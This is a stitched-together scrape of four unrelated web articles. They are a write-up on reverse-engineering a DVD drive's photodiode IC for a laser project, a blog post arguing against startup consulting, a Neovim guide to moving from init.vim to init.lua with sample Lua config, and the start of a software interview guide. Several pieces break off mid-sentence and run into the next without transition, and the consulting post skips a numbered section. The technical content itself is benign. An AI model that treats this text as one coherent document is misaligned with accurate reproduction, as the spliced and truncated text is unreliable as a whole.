<h3 id="pdic">PDIC</h3>
<div>

<p>
The PDIC (Photo Diode Integrated Circuit), in a DVD reader application, serves multiple purposes. These include gathering focus, tilt and tracking information from the disk as well as recovery of the RF data stored on the disk tracks. For this reason, PDICs typically consist of at least 6 active diode areas, sometimes even more. The PDIC used in the available drive type is seen below. Given its a very niche device, oftentimes custom-designed for a specific drive vendor, datasheets are hard to come by. Initial pinout probing revealed only the power supply pin locations and a number of analog output pins, but I was unable to find any matching ICs datasheets, so some reverse engineering effort was required to figure out its secrets.
</p>

<p>
First, the device was placed on a little break-out PCB to allow easy access to all of its pins, especially during microscope inspections.
</p>

<p>
<a href="https://loetlabor-jena.de/lib/exe/detail.php?id=projekte%3Advdlsm%3Astart&amp;media=projekte:dvdlsm:pdic_breakout.jpg" title="projekte:dvdlsm:pdic_breakout.jpg"><img src="https://loetlabor-jena.de/lib/exe/fetch.php?w=600&amp;tok=63dc0c&amp;media=projekte:dvdlsm:pdic_breakout.jpg" alt="" width="600"></a>
</p>

</div>

<h4 id="pdic_reverse_engineeringoptical">PDIC Reverse Engineering: Optical</h4>
<div>

<p>
Using an IC inspection microscope, a die shot of the PDIC was produced. This was useful to get a better idea of the internal structure of the device. This process is made way easier by the fact that it is an optical integrated circuit, and is therefore housed inside a clear plastic package with good optical properties, suitable for direct microscope inspection without decapsulation. The picture below could be used to identify some functional blocks of the circuit, however full tracing from the bondpads through internal circuits to the diode quadrants didn't really go anywhere for me. However, it became apparent that the PDIC apparently houses at least independent eight photo diode channels. (Four quadrants in the center square, and at least two segments for each of the outer squares).
</p>

<p>
<a href="https://loetlabor-jena.de/lib/exe/detail.php?id=projekte%3Advdlsm%3Astart&amp;media=projekte:dvdlsm:chip_res.jpg" title="projekte:dvdlsm:chip_res.jpg"><img src="https://loetlabor-jena.de/lib/exe/fetch.php?w=600&amp;tok=2205d3&amp;media=projekte:dvdlsm:chip_res.jpg" alt="" width="600"></a>
</p>

</div>

<h4 id="pdic_reverse_engineeringelectro-optical">PDIC Reverse Engineering: Electro-Optical</h4>
<div>

<p>
On most of the pins, some change in output voltage could be seen when illuminating the device with a bright source of light. At first, the output behavior of each pin was simply put into different categories:
</p>
<ul>
<li><p> Low light sensitivity: 4 outputs</p>
</li>
<li><p> High light sensitivity: 4 outputs</p>
</li>
<li><p> Same magnitude, but opposite polarity outputs (differential pair): 2 pins</p>
</li>
<li><p> Negative output voltage: 1 pin</p>
</li>
</ul>

<p>
It was conjectured that the smaller inner quadrants were responsible for the low-sensitivity outputs, while the outer segments would produce a large amplitude (due to their larger light collection area).
</p>

<p>
In a second reverse engineering session, the exact pinout was determined by means of selective illumination: For a given test, two IC output pins were compared using two DVMs, and an aperture was slowly moved along the surface, either vertically or horizontally. This would in result a change of the output voltage for one of the outputs slightly earlier than for the other one. In this way, the positional relationships between all output pins could be resolved, forming a final assignment of diode quadrants to output pins.
</p>

<p>
<a href="https://loetlabor-jena.de/lib/exe/detail.php?id=projekte%3Advdlsm%3Astart&amp;media=projekte:dvdlsm:pinout_bg.png" title="projekte:dvdlsm:pinout_bg.png"><img src="https://loetlabor-jena.de/lib/exe/fetch.php?w=800&amp;tok=eea749&amp;media=projekte:dvdlsm:pinout_bg.png" alt="" width="800"></a>
</p>

<p>
The output producing negative voltages is not considered to be useful in the final application, while the differential output pair is likely a summed output of the four inner quadrants (the high bandwidth RF output). With the assignment of pins to diode quadrants done, the OPU could be modified to fan-out the required connections to custom electronics
</p>

</div>

<h3 id="opu_modification">OPU Modification</h3>
<div>

<p>
The whole top assembly of the DVD drive is reused. This includes not only the OPU, but also the linear (worm gear) axis driven by a stepper motor and its base plate. A breadboard header was added to the OPU, fanning out all required signals to the custom electronics on a ribbon cable. The analog output signals are separated on one side, while the current inputs for the laser diode and the lens actuators are kept to the other side. This should help mitigate electrical coupling between these signals, even though the diode outputs are actively driven by the PDIC.
</p>

<p>
The other axis (below the drive mechanism) is built from a commercial precision linear actuator that was donated to the project. Other people have simply used another DVD drive in its place, which would certainly be a possibility here.
</p>

<p>

</p>

</div>

<h2 id="electronics">Electronics</h2>
<div>

<p>
A PCB was designed that would fulfill all necessary interfacing between PC and the optical components. Those would be:
</p>
<ul>
<li><p> Drive motors for X/Y axes</p>
</li>
<li><p> Drive the lens actuator coils (constant current/voltage)</p>
</li>
<li><p> Drive the laser LEDs (constant current)</p>
</li>
<li><p> Provide power supply</p>
</li>
</ul>

<p>
It was pretty obvious that at least all the mechanical actuation and laser driving could be handled by an IC foreseen for an optical drive. Texas Instruments offers a line-up of such chips, which are one of the few types that can easily be sourced from common distributors. The <a href="https://www.ti.com/product/TPIC2050" title="https://www.ti.com/product/TPIC2050" rel="ugc nofollow">TI TPIC2050</a> was chosen due to its all-digital interface and flexible output options. Given it's a pretty high-quantity component, its cost is very reasonable (€2.50 in single quantities) and can hardly be beaten by any other integrated options.
</p>

<p>
A PCB was designed around this IC, with an additional 16 bit ADC plus analog MUX for the PDIC outputs. The PCB was built to house an <a href="https://www.crowdsupply.com/1bitsquared/icebreaker-fpga" title="https://www.crowdsupply.com/1bitsquared/icebreaker-fpga" rel="ugc nofollow">iceBreaker FPGA board</a> that would take care of all the interfacing. All electronics were designed in KiCad and are available publicly in its <a href="https://git.loetlabor-jena.de/dvdlaser/dvdlaser_hw" title="https://git.loetlabor-jena.de/dvdlaser/dvdlaser_hw" rel="ugc nofollow">GitLab repository</a>.

</p>

<h2 id="fpga_design">FPGA Design</h2>
<div>

<p>
The FPGA had to fulfill a couple of interfacing tasks, and the design uses the <abbr title="Free &amp; Open-Source Software">FOSS</abbr> FPGA toolchain for the Lattice ice40 UP5k FPGA on the iceBreaker board. It mainly does the following things:
</p>
<ul>
<li><p> Automatically cycle through ADC MUX channels and read out photo diode currents</p>
</li>
<li><p> Provide register-level access to the TPIC2050 from the host software</p>
</li>
<li><p> Provide fast write access to the TPIC2050 DACs</p>
</li>
<li><p> Allow communications to the host PC using a 1Mbps USB-Serial connection</p>
</li>
</ul>

<p>
The design itself is quite straight forward, but I had a bit of fun with the verification environment. I used <a href="https://github.com/cocotb/cocotb/" title="https://github.com/cocotb/cocotb/" rel="ugc nofollow">cocotb</a> and iverilog for all the simulations. The testbenches contain proper hardware device models for all ICs as well as the optical chain. The simulated UART interface can be connected to a virtual serial port, which can then be stimulated by the real host software. This allows running a full „simulated hardware in the loop“ test, which is quite a neat thing to have.
</p>

<p>
Setting a focus actuator current would alter the optical chain, resulting in different values digitized by the ADC for the various photo diode …</p></div></div></div>

11 minute read
</p>
<p>One of my friends recently brought up the idea of consulting for startups. He’s been working in software for almost two decades, and he’s worked for a few well-known startups in the area. He definitely has skills and knowledge that would be valuable for a startup, so he was surprised when I told him <strong>startup consulting is not a good idea.</strong></p>
<p>I’ve thought about this topic a lot. I have worked for early-stage startups, done some startup consulting, and met plenty of startup consultants. A few of them have actually been pretty successful.</p>
<p>That said, I steer consultants away from startups when they ask, and in this post, I’ll explain why. <a href="https://www.karllhughes.com/posts/working-at-startup">I love working with startups</a>, so please don’t read this as a knock against them. As you’ll see, they’re just an objectively poor target market for consultants.</p>
<p><em>Learning more about startups? I’ve compiled a list of <a href="https://www.karllhughes.com/posts/startup-books">my favorite books for founders here</a>.</em></p>
<h2 id="what-is-startup-consulting">What is Startup Consulting?</h2>
<p>First off, when I say “consultant,” I’m not talking about freelancers or contract hires. Those two categories of employees are essentially tax shelters for small companies that can’t afford full-time people yet, and their work is typically very execution-focused.</p>
<p>I’m also not talking about advisors, mentors, or coaches. People in these roles are typically more focused on asking questions or serving as a sounding board. If you’re an experienced entrepreneur coaching a new founder, that’s great. I have several mentors, and they’re invaluable, but they don’t make a living from helping people like me.</p>
<p>A startup consultant is someone whose business is to come into a small company, ask some questions, analyze the data, prepare a report, and make recommendations based on their findings. They don’t execute tasks or manage team members directly (although there are exceptions) but focus instead on high-level strategy.</p>
<p>Startup consultants aren’t typically involved for the long-term (and are almost never offered equity), but the good ones might provide some follow-through to see how their recommendations pan out. They might also offer a retainer to answer questions about their recommendations as they come up, but they usually aren’t part of the day-to-day.</p>
<h3 id="why-do-people-start-consulting-for-startups">Why Do People Start Consulting for Startups?</h3>
<p><strong>The most lucrative piece of the consulting market is focused on Fortune 500 companies.</strong> That’s where giants like <a href="https://www.consultancy.uk/news/14018/the-10-largest-consulting-firms-in-the-world">PwC, Deloitte, E&amp;Y, KPMG, McKinsey, and BCG</a> all play, but for one-person consulting shops or small agencies, it’s pretty hard to land one of these customers.</p>
<p>So, many new consultants set their sites on startups. Some figure they can take their experience from a larger company (or, god forbid, <a href="https://www.cleverism.com/why-you-should-not-hire-mbas-for-startup/">an MBA</a>) to help early-stage startups “grow up.” Others trade on a former employer’s success (i.e., people who put “Formerly Google/Apple/Facebook/etc.” in their Linkedin bios), using name recognition to attract startups that like having a name brand behind their consultants.</p>
<p>These hopeful new consultants hang up their shingles, offering something vague like “Proven Growth Strategies” or “Scalable Product-Led Growth.” If they <a href="https://www.karllhughes.com/posts/the-key-to-networking-keeping-in-touch">have a deep personal network</a>, they’ll probably find enough clients to survive for a couple of years, but most of them won’t stick with the startup market long.</p>
<h2 id="the-case-against-startup-consulting">The Case Against Startup Consulting</h2>
<p>While startups can make decisions quickly - <a href="https://www.fastcompany.com/3006682/not-so-fast-10-hasty-mistakes-startup-founders-make">almost to a fault</a> - they aren’t an easy market to serve. They’re price sensitive, have high expectations, and prone to failure. Let’s dive into each of these points and see how they affect startup consulting.</p>
<h3 id="1-founders-have-unrealistic-expectations">1. Founders Have Unrealistic Expectations</h3>
<p>What consultants offer is squishy, and for big companies, it can be more political than practical:</p>
<blockquote>
<p>“CEOs that want or need to make an unpopular decision often bring in a consulting firm to help. This provides ammunition to recommend an unpopular or risky decision to the board. The CEO can also distance herself from an unpopular decision by blaming the consultants.” - <a href="https://www.quora.com/What-value-do-consulting-firms-like-McKinsey-Bain-et-al-really-add-to-an-operation-What-exactly-is-it-that-they-do-that-commands-such-premium-compensation-and-more-importantly-has-created-an-entire-sustainable-and-enduring-industry/answer/Raj-Ramanan">Raj Ramanan, Co-Founder at Loku</a></p>
</blockquote>
<p><strong>While large companies hire consultants to validate decisions or reassure institutional investors, startups hope you will solve their deepest, darkest problems.</strong> Your recommendation isn’t just a handy report for investors - they’re going to stake the future of their business on it.</p>
<p><img src="https://i.imgur.com/YkVXgqm.png" alt="Large company vs. startup consulting"></p>
<p>While you will certainly send the startup off with the strategy document you promised, anyone who has worked with a startup knows that <strong>things change too fast for a static recommendation like this to make any difference</strong>. They’re going to need you to come back and revise the strategy as they learn new things. Unfortunately, you probably didn’t build that into the price, so now you’re annoyed that they won’t just follow your original plan, and they’re annoyed that they spent $20k for an outdated document.</p>
<h3 id="2-price-sensitivity">2. Price Sensitivity</h3>
<p>As a consultant, it would seem that the obvious solution to the first problem is to simply <em>charge the startup more for ongoing help</em>. The problem is that <strong>startups must be frugal to survive</strong>.</p>
<blockquote>
<p>“People who are cheap are much more likely to succeed. And not just because their money lasts longer; a frugal attitude seems to correlate with success.” - <a href="https://news.ycombinator.com/item?id=189830">Paul Graham, Y Combinator</a></p>
</blockquote>
<p>Most funded startups are trading on borrowed time and get 12-18 months of runway per fundraise. Bootstrapped startups aren’t any better because the founders tend to be sacrificing more out of pocket to keep the lights on.</p>
<p>While large companies get budgets earmarked for hiring consultants or completing specific projects, small startups usually have to run all major expenditures by the founder. I’ve known founders who won’t let division heads charge so much as $100 to the company card without clearance from the CEO.</p>
<p>So while you look at your $200 per hour price tag as a bargain for startups (McKinsey is charging <a href="https://www.afr.com/politics/federal/revealed-mckinsey-partners-charge-16-000-a-day-before-discounts-20190808-p52f2a">$16k per day, after all</a>), they see it as a significant line item on a razor-thin budget. Misalignment like this is bound to lead to disappointment on one side or the other.</p>
<p><img src="https://i.imgur.com/pP8Astj.png" alt="Price sensitivity in startups"></p>
<h3 id="3-startups-need-more-hands-not-brains">3. Startups Need More Hands Not Brains</h3>
<blockquote>
<p>“In truth, startups rarely need new ideas — they already have more than they know what to do with. So adding yet more ideas to the backlog is stressful, especially without the resources to execute them.” - <a href="https://medium.com/swlh/why-startups-hate-consultants-5b245ec275d3">Dave Bailey, CEO Coach</a></p>
</blockquote>
<p>I recently met with a startup that hired a very senior person from a big tech firm. He loved having a big title, but when the time came to build the product, he was unwilling to roll up his sleeves and write any code.</p>
<p><strong>“I’m the CTO who drives the Ferrari, not the Toyota,”</strong> he said.</p>
<p>In the first few years, startup founders spend at least 80% of their time on low-level, hands-on drudgery: sales calls, product development, social media management, writing email campaigns, hiring key people, setting up payroll/books/insurance/etc…It’s not glamorous work, but it needs to get done.</p>
<p><img src="https://i.imgur.com/WTxowB5.png" alt="Startup founders and grunt work"></p>
<p>So, it’s tough for a startup to justify bringing on a consultant who <em>only</em> offers high-level strategy at an hourly rate many times higher than their early employees.</p>
<p>Most startup founders who have cleared the first couple of bars by doing some fundraising and making some sales are pretty smart people. They don’t need a consultant who’s never been in their shoes to tell them how to run their business; they need humble people who can get their hands dirty and make shit happen.</p>

<blockquote>
<p>“Consultants had a very topical view of our business, did not sit with us every day, and did not have the same passion and zeal for our company that we as founders naturally had. After three months, we stopped using them and learned a very important lesson.” - <a href="https://www.startups.com/library/expert-advice/should-you-hire-startup-consultants">Gray Skinner, CEO at Droplr</a></p>
</blockquote>
<p>Even if you restrict your work to startups within a single industry or market, as a consultant, you’re never going to be as “bought-in” as the founders. So, when you come in and make a recommendation that flies counter to what the founder believes, they can simply write it off. “She must not see what we see.”</p>
<p>Whether the founder is right or wrong doesn’t matter. What matters is their perception that outside consultants are never going to be as dedicated or see the vision that they do.</p>
<p>You might be able to filter startups out if they’re especially hostile to consultants, but it’s usually hard to tell what their attitude will be until you start to make recommendations to them.</p>
<h3 id="5-the-expert-problem">5. The “Expert” Problem</h3>
<p>Most consultants consider themselves experts in some specific field. That’s great, but as I’ve pointed out in the past, <a href="https://www.karllhughes.com/posts/experts">experts fall prey to the same biases that the rest of us do</a>.</p>
<p>For one thing, many consultants tend to overgeneralize their experience. If you’ve been in marketing at a few startups, you might think you know everything there is to know about startup marketing. Even if you don’t project this hubris publicly, it affects the way you make decisions and closes you off to new inputs.</p>
<blockquote>
<p>“We love anecdotes so much because it’s often much easier for people to believe someone’s testimony as opposed to understanding complex data and variation across a continuum. Anecdotes exempt us from having to prove our point: it’s happened once; that’s solid proof as far as I’m concerned.” - <a href="https://manuel.friger.io/blog/advice">Manuel Frigerio</a></p>
</blockquote>
<p>This overgeneralization problem seems especially toxic in startup consulting because what worked in <a href="">cutting-edge startups</a> five years ago won’t necessarily work today.</p>
<blockquote>
<p>“The solution the firm comes up involves a high tech presentation and even higher tech case studies, but when it comes to the true substance of the steps they recommend, it may as well be 1982.” - <a href="https://www.inc.com/michael-schein/how-consultants-kill-business.html">Michael Schein, CEO at Microfame Media</a></p>
</blockquote>
<h3 id="6-founders-need-to-learn-for-themselves">6. Founders Need to Learn for Themselves</h3>
<p>I recently saw a consultant who would sit down with a founder in <em>any industry</em> for an hour and tell them which marketing channels they should use.</p>
<p>I am skeptical that this will work. A startup’s early successful marketing channels will be based on which avenues the founder is most familiar with and where their target market hangs out. You can tell a founder to “just use Instagram ads,” but if they’ve never run an Instagram …</p></div></article></section></div>

            <section>
              07 Feb, 2021
            </section>

            
            <h2>And switching from init.vim to init.lua</h2>
            <p>If you, like me, never really understood Vimscript and hate the language
with a passion, you’re in the right place! You can now get rid of
Vimscript wholesale and replace it with a simpler, faster and elegant-er
language — Lua! <em>However</em>, this is only possible from Neovim 0.5
onwards<sup id="fnref:1"><a href="#fn:1">1</a></sup> and as of now, requires you to install Neovim from HEAD. How
to do that is left as an exercise to the reader. Also bear in mind that
the Lua API is fairly beta right now, and many Vim things don’t have
direct interfaces.</p>

<p>So assuming you’re now running Neovim <code>master</code>, head over to
<code>~/.config/nvim</code> and create your <code>init.lua</code>. Why, yes, we’re porting
over your <code>init.vim</code> to <code>init.lua</code> right now! Clear your calendar for
the next few hours — bikeshedding your text editor is top priority!</p>

<p>I also recommend going through
<a href="https://github.com/nanotee/nvim-lua-guide" rel="nofollow">nanotee/nvim-lua-guide</a>
and <a href="https://learnxinyminutes.com/docs/lua/" rel="nofollow">Learn Lua in Y minutes</a>
before starting off.</p>

<h2>the directory structure</h2>

<p>Lua files are typically under <code>~/.config/nvim/lua</code>, and can be loaded as
Lua modules. This is incredibly powerful — you can structure your
configs however you like.</p>
<pre>$ tree .config/nvim
.
|-- ftplugin
|   `-- ...
|-- init.lua
|-- lua
|   |-- maps.lua
|   |-- settings.lua
|   |-- statusline.lua
|   `-- utils.lua
`-- plugin
    `-- ...
</pre>
<p>The common approach is to have different
bits of your config in Lua files under <code>lua/</code> and <code>require</code>’d in your
<code>init.lua</code>, so something like:</p>
<pre><span>-- init.lua</span>

require(<span>'</span><span>settings</span><span>'</span>)    <span>-- lua/settings.lua</span>
require(<span>'</span><span>maps</span><span>'</span>)        <span>-- lua/maps.lua</span>
require(<span>'</span><span>statusline</span><span>'</span>)  <span>-- lua/statusline.lua</span>
</pre>
<h2>the basics: setting options</h2>

<p>Vim has 3 kinds of options — global, buffer-local and window-local. In
Vimscript, you’d just <code>set</code> these. In Lua, however, you will have to
use one of</p>

<ul>
<li><code>vim.api.nvim_set_option()</code> — global options</li>
<li><code>vim.api.nvim_buf_set_option()</code> — buffer-local options</li>
<li><code>vim.api.nvim_win_set_option()</code> — window-local options</li>
</ul>

<p>These are fairly verbose and very clunky, but fortunately for us, we
have “meta-accesors” for these: <code>vim.{o,wo,bo}</code>. Here’s an excerpt from
my <code>settings.lua</code> as an example:</p>
<pre><span>local</span> o = vim.o
<span>local</span> wo = vim.wo
<span>local</span> bo = vim.bo

<span>-- global options</span>
o.swapfile = <span>true</span>
o.dir = <span>'</span><span>/tmp</span><span>'</span>
o.smartcase = <span>true</span>
o.laststatus = 2
o.hlsearch = <span>true</span>
o.incsearch = <span>true</span>
o.ignorecase = <span>true</span>
o.scrolloff = 12
<span>-- ... snip ... </span>

<span>-- window-local options</span>
wo.number = <span>false</span>
wo.wrap = <span>false</span>

<span>-- buffer-local options</span>
bo.expandtab = <span>true</span>
</pre>
<p>If you’re not sure if an option is global, buffer or window-local,
consult the Vim help! For example, <code>:h 'number'</code>:</p>
<pre>'number' 'nu'           boolean (default off)
                        local to window
</pre>
<p>Also note that you don’t set the negation of an option to true, like
<code>wo.nonumber = true</code>, you instead set <code>wo.number = false</code>.</p>

<h2>defining autocommands</h2>

<p>Unfortunately, autocommands in Vim don’t have a Lua interface — it is
being worked on.<sup id="fnref:2"><a href="#fn:2">2</a></sup> Until then, you will have to use
<code>vim.api.nvim_command()</code>, or the shorter <code>vim.cmd()</code>. I’ve defined a
simple function that takes a Lua table of <code>autocmd</code>s as an argument, and
creates an <code>augroup</code> for you.</p>
<pre><span>-- utils.lua</span>

<span>local</span> M = {}
<span>local</span> cmd = vim.cmd

<span>function</span> <span>M</span>.create_augroup(autocmds, name)
    cmd(<span>'</span><span>augroup </span><span>'</span> .. name)
    cmd(<span>'</span><span>autocmd!</span><span>'</span>)
    <span>for</span> _, autocmd <span>in</span> ipairs(autocmds) <span>do</span>
        cmd(<span>'</span><span>autocmd </span><span>'</span> .. table.concat(autocmd, <span>'</span><span> </span><span>'</span>))
    <span>end</span>
    cmd(<span>'</span><span>augroup END</span><span>'</span>)
<span>end</span>

<span>return</span> M

<span>-- settings.lua</span>
<span>local</span> cmd = vim.cmd
<span>local</span> u = require(<span>'</span><span>utils</span><span>'</span>)

u.create_augroup({
    { <span>'</span><span>BufRead,BufNewFile</span><span>'</span>, <span>'</span><span>/tmp/nail-*</span><span>'</span>, <span>'</span><span>setlocal</span><span>'</span>, <span>'</span><span>ft=mail</span><span>'</span> },
    { <span>'</span><span>BufRead,BufNewFile</span><span>'</span>, <span>'</span><span>*s-nail-*</span><span>'</span>, <span>'</span><span>setlocal</span><span>'</span>, <span>'</span><span>ft=mail</span><span>'</span> },
}, <span>'</span><span>ftmail</span><span>'</span>)

cmd(<span>'</span><span>au BufNewFile,BufRead * if &amp;ft == "" | set ft=text | endif</span><span>'</span>)
</pre>
<h2>defining keymaps</h2>

<p>Keymaps can be set via <code>vim.api.nvim_set_keymap()</code>. It takes 4
arguments: the mode for which the mapping will take effect, the key
sequence, the command to execute and a table of options (<code>:h
:map-arguments</code>).</p>
<pre><span>-- maps.lua</span>

<span>local</span> map = vim.api.nvim_set_keymap

<span>-- map the leader key</span>
map(<span>'</span><span>n</span><span>'</span>, <span>'</span><span>&lt;Space&gt;</span><span>'</span>, <span>'</span><span>'</span>, {})
vim.g.mapleader = <span>'</span><span> </span><span>'</span>  <span>-- 'vim.g' sets global variables</span>


options = { noremap = <span>true</span> }
map(<span>'</span><span>n</span><span>'</span>, <span>'</span><span>&lt;leader&gt;&lt;esc&gt;</span><span>'</span>, <span>'</span><span>:nohlsearch&lt;cr&gt;</span><span>'</span>, options)
map(<span>'</span><span>n</span><span>'</span>, <span>'</span><span>&lt;leader&gt;n</span><span>'</span>, <span>'</span><span>:bnext&lt;cr&gt;</span><span>'</span>, options)
map(<span>'</span><span>n</span><span>'</span>, <span>'</span><span>&lt;leader&gt;p</span><span>'</span>, <span>'</span><span>:bprev&lt;cr&gt;</span><span>'</span>, options)
</pre>
<p>For user defined commands, you’re going to have to go the <code>vim.cmd</code>
route:</p>
<pre><span>local</span> cmd = vim.cmd

cmd(<span>'</span><span>:command! WQ wq</span><span>'</span>)
cmd(<span>'</span><span>:command! WQ wq</span><span>'</span>)
cmd(<span>'</span><span>:command! Wq wq</span><span>'</span>)
cmd(<span>'</span><span>:command! Wqa wqa</span><span>'</span>)
cmd(<span>'</span><span>:command! W w</span><span>'</span>)
cmd(<span>'</span><span>:command! Q q</span><span>'</span>)
</pre>
<h2>managing packages</h2>

<p>Naturally, you can’t use your favourite Vimscript package manager
anymore, or at least, not without <code>vim.api.nvim_exec</code>ing a bunch of
Vimscript (ew!). Thankfully, there are a few pure-Lua plugin managers
available to use<sup id="fnref:3"><a href="#fn:3">3</a></sup> — I personally use, and recommend
<a href="https://github.com/savq/paq-nvim/" rel="nofollow">paq</a>. It’s light and makes use of
the <a href="https://docs.libuv.org/en/v1.x/" rel="nofollow"><code>vim.loop</code></a> API for async I/O.
paq’s docs are plentiful, so I’ll skip talking about how to set it up.</p>

<h2>bonus: writing your own statusline</h2>

<p>Imagine using a bloated, third-party statusline, when you can just write
your own.<sup id="fnref:4"><a href="#fn:4">4</a></sup> It’s actually quite simple! Start by defining a table for
every mode:</p>
<pre><span>-- statusline.lua</span>

 <span>local</span> mode_map = {
	[<span>'</span><span>n</span><span>'</span>] = <span>'</span><span>normal </span><span>'</span>,
	[<span>'</span><span>no</span><span>'</span>] = <span>'</span><span>n·operator pending </span><span>'</span>,
	[<span>'</span><span>v</span><span>'</span>] = <span>'</span><span>visual </span><span>'</span>,
	[<span>'</span><span>V</span><span>'</span>] = <span>'</span><span>v·line </span><span>'</span>,
	[<span>'</span><span></span><span>'</span>] = <span>'</span><span>v·block </span><span>'</span>,
	[<span>'</span><span>s</span><span>'</span>] = <span>'</span><span>select </span><span>'</span>,
	[<span>'</span><span>S</span><span>'</span>] = <span>'</span><span>s·line </span><span>'</span>,
	[<span>'</span><span></span><span>'</span>] = <span>'</span><span>s·block </span><span>'</span>,
	[<span>'</span><span>i</span><span>'</span>] = <span>'</span><span>insert </span><span>'</span>,
	[<span>'</span><span>R</span><span>'</span>] = <span>'</span><span>replace </span><span>'</span>,
	[<span>'</span><span>Rv</span><span>'</span>] = <span>'</span><span>v·replace </span><span>'</span>,
	[<span>'</span><span>c</span><span>'</span>] = <span>'</span><span>command </span><span>'</span>,
	[<span>'</span><span>cv</span><span>'</span>] = <span>'</span><span>vim ex </span><span>'</span>,
	[<span>'</span><span>ce</span><span>'</span>] = <span>'</span><span>ex </span><span>'</span>,
	[<span>'</span><span>r</span><span>'</span>] = <span>'</span><span>prompt </span><span>'</span>,
	[<span>'</span><span>rm</span><span>'</span>] = <span>'</span><span>more </span><span>'</span>,
	[<span>'</span><span>r?</span><span>'</span>] = <span>'</span><span>confirm </span><span>'</span>,
	[<span>'</span><span>!</span><span>'</span>] = <span>'</span><span>shell </span><span>'</span>,
	[<span>'</span><span>t</span><span>'</span>] = <span>'</span><span>terminal </span><span>'</span>
}
</pre>
<p>The idea is to get the current mode from <code>vim.api.nvim_get_mode()</code> and
map it to our desired text. Let’s wrap that around in a small <code>mode()</code>
function:</p>
<pre><span>-- statusline.lua</span>

<span>local</span> <span>function</span> mode()
	<span>local</span> m = vim.api.nvim_get_mode().mode
	<span>if</span> mode_map[m] == <span>nil</span> <span>then</span> <span>return</span> m <span>end</span>
	<span>return</span> mode_map[m]
<span>end</span>
</pre>
<p>Now, set up your highlights. Again, there isn’t any interface for
highlights yet, so whip out that <code>vim.api.nvim_exec()</code>.</p>
<pre><span>-- statusline.lua</span>

vim.api.nvim_exec(
<span>[[
</span><span>  hi PrimaryBlock   ctermfg=06 ctermbg=00
</span><span>  hi SecondaryBlock ctermfg=08 ctermbg=00
</span><span>  hi Blanks   ctermfg=07 ctermbg=00
</span><span>]]</span>, <span>false</span>)
</pre>
<p>Create a new table to represent the entire statusline itself. You can
add any other functions you want (like one that returns the current git
branch, for instance). Read <code>:h 'statusline'</code> if you don’t understand
what’s going on here.</p>
<pre><span>-- statusline.lua</span>

<span>local</span> stl = {
  <span>'</span><span>%#PrimaryBlock#</span><span>'</span>,
  mode(),
  <span>'</span><span>%#SecondaryBlock#</span><span>'</span>,
  <span>'</span><span>%#Blanks#</span><span>'</span>,
  <span>'</span><span>%f</span><span>'</span>,
  <span>'</span><span>%m</span><span>'</span>,
  <span>'</span><span>%=</span><span>'</span>,
  <span>'</span><span>%#SecondaryBlock#</span><span>'</span>,
  <span>'</span><span>%l,%c </span><span>'</span>,
  <span>'</span><span>%#PrimaryBlock#</span><span>'</span>,
  <span>'</span><span>%{&amp;filetype}</span><span>'</span>,
}
</pre>
<p>Finally, with the power of <code>table.concat()</code>, set your statusline. This
is akin to doing a series of string concatenations, but way faster.</p>
<pre><span>-- statusline.lua</span>

vim.o.statusline = table.concat(stl)
</pre>
<p><img src="https://x.icyphox.sh/statusline.png" alt="statusline"></p>

<h2>this is what being tpope feels like</h2>

<p>You can now write that plugin you always wished for! I sat down to write
a plugin for <a href="https://github.com/jhawthorn/fzy" rel="nofollow">fzy</a><sup id="fnref:5"><a href="#fn:5">5</a></sup>, which you can
find <a href="https://git.icyphox.sh/dotfiles/tree/config/nvim/lua/fzy" rel="nofollow">here</a>
along with my entire Neovim config<sup id="fnref:6"><a href="#fn:6">6</a></sup>. I plan to port a the last of my
<code>plugin/</code> directory over to Lua, soon™.</p>

<p>And it’s only going to get better when the Lua API is completed. We can
all be Vim plugin artists now.</p>

<p>I used to think that one of the things college would teach me is how to get a job in the tech industry.&nbsp;</p>



<p>It didn’t.</p>



<p>Until I interviewed at a tech giant for the first time, I didn’t even know that there was a specific interview process, much less how I could prepare for it.&nbsp;</p>



<p>Now that I live in Silicon Valley and work for a tech giant, I realize that there are two main things that people talk about here: that the <a href="https://news.ycombinator.com/item?id=23848039" data-type="URL" data-id="https://news.ycombinator.com/item?id=23848039">engineering</a> <a href="https://github.com/poteto/hiring-without-whiteboards" data-type="URL" data-id="https://github.com/poteto/hiring-without-whiteboards">interview process</a> <a href="https://twitter.com/mxcl/status/608682016205344768?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E608682016205344768%7Ctwgr%5E%7Ctwcon%5Es1_c10&amp;ref_url=https%3A%2F%2Fpublish.twitter.com%2F%3Fquery%3Dhttps3A2F2Ftwitter.com2Fmxcl2Fstatus2F608682016205344768widget%3DTweet" data-type="URL" data-id="https://twitter.com/mxcl/status/608682016205344768?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E608682016205344768%7Ctwgr%5E%7Ctwcon%5Es1_c10&amp;ref_url=https%3A%2F%2Fpublish.twitter.com%2F%3Fquery%3Dhttps3A2F2Ftwitter.com2Fmxcl2Fstatus2F608682016205344768widget%3DTweet">is broken</a>, and everyone should just start their own companies instead for working for someone else.&nbsp;</p>



<p>In time, the companies working on <a href="https://twitter.com/LambdaSchool?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor" data-type="URL" data-id="https://twitter.com/LambdaSchool?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor">fixing the interview process</a> might well succeed, or in the end it won’t matter anyway because by then we’ll all be <a href="https://twitter.com/IndieHackers" data-type="URL" data-id="https://twitter.com/IndieHackers">indie hackers</a>. But for those of us who need jobs today, the reality is that the current process is what we have to work with. <strong>And if we want to</strong> <strong>work for the best companies out there, we need to know what the interview process is going to look like and how to prepare for it.</strong>&nbsp;</p>



<p>So with that in mind, here is the most comprehensive guide to the software engineering interview process you’ll find on the internet today; one that I wish someone had written for me when I was in college. In addition to doing everything we talk about here, you’re also going to need luck. But since neither you nor I have any control over that, let’s focus on making sure that when the opportunity presents itself, you’ll be ready for it.&nbsp;&nbsp;</p>




<h2><span id="Part_0_What_is_your_goal"></span>Part 0: What is your goal?<span></span></h2>



<h3><span id="What_kind_of_job_do_you_want"></span>What kind of job do you want?<span></span></h3>



<p>The first thing you need to think about is what kind of job you want. There are many flavors of software engineer – full-stack engineer, distributed systems engineer, machine learning engineer, backend engineer, frontend engineer, mobile engineer, security engineer, dev ops engineer and more.</p>



<p>If you’re completely new to searching for a role:</p>



<ul><li>Read about the differences between the types of software engineers.</li></ul>



